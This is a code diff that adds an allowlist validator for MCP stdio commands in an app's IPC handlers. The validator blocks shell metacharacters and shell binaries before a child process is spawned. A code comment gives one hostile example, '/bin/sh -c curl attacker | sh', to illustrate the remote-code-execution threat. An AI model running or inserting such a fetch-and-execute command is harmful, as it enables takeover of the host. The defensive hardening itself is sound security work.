@@ -10,6 +10,38 @@ import {
 } from '../db/queries/mcp-servers'
 import { mcpManagerService } from '../services/mcp-manager.service'
 
+// Defense-in-depth: whitelist MCP stdio commands to common package runners
+// + absolute paths under /usr/ or /opt/. Blocks /bin/sh, bash -c, and similar
+// shell-invoking binaries from reaching child_process.spawn.
+// Without this, a compromised renderer (XSS) could register an MCP with
+// command: '/bin/sh', args: ['-c', 'curl attacker | sh'] and RCE the main process.
+const ALLOWED_MCP_COMMAND_BASENAMES = new Set([
+  'npx', 'bunx', 'pnpx', 'node', 'bun', 'deno',
+  'python', 'python3', 'uv', 'uvx', 'pipx', 'pip',
+  'ruby', 'rbenv',
+  'go', 'cargo',
+  'docker', 'podman',
+])
+
+function validateMcpCommand(command: string | undefined | null): void {
+  if (!command) return
+  const trimmed = command.trim()
+  if (!trimmed) throw new Error('MCP command is empty')
+  // Block shell metacharacters in the command string itself
+  if (/[;&|`$<>(){}\n\r]/.test(trimmed)) {
+    throw new Error('MCP command contains shell metacharacters')
+  }
+  // Extract the basename (last path segment)
+  const basename = trimmed.split(/[\\/]/).pop() ?? trimmed
+  if (ALLOWED_MCP_COMMAND_BASENAMES.has(basename)) return
+  // Allow absolute paths under /usr/ or /opt/ (system package managers)
+  if (/^\/(?:usr|opt)\//.test(trimmed)) return
+  throw new Error(
+    `MCP command "${basename}" is not in the allowlist. ` +
+    `Allowed: ${[...ALLOWED_MCP_COMMAND_BASENAMES].join(', ')} or absolute paths under /usr/ or /opt/.`
+  )
+}
+
 const createSchema = z.object({
   name: z.string().min(1).max(100),
   description: z.string().max(500).optional(),
@@ -119,6 +151,11 @@ export function registerMcpIpc(): void {
       throw new Error('URL is required for HTTP/SSE transport')
     }
 
+    // Defense-in-depth: validate command against an allowlist of package runners
+    if (rest.transportType === 'stdio') {
+      validateMcpCommand(rest.command)
+    }
+
     // Encrypt env vars if provided
     let envEncrypted: string | undefined
     if (envVars && Object.keys(envVars).length > 0) {
@@ -154,6 +191,11 @@ export function registerMcpIpc(): void {
     if (!parsed.success) throw new Error(`Invalid payload: ${parsed.error.message}`)
 
     const { envVars, ...rest } = parsed.data
+
+    // Defense-in-depth: validate command if it is being updated
+    if (rest.command !== undefined && rest.command !== null) {
+      validateMcpCommand(rest.command)
+    }
 
     // Build update data
     const updateData: Parameters<typeof updateMcpServer>[1] = { ...rest }
@@ -263,6 +305,11 @@ export function registerMcpIpc(): void {
     if (!parsed.success) throw new Error(`Invalid payload: ${parsed.error.message}`)
 
     const { envVars, ...config } = parsed.data
+
+    // Defense-in-depth: validate command before spawning a child process
+    if (config.transportType === 'stdio') {
+      validateMcpCommand(config.command)
+    }
 
     return await mcpManagerService.testConnection({
       ...config,
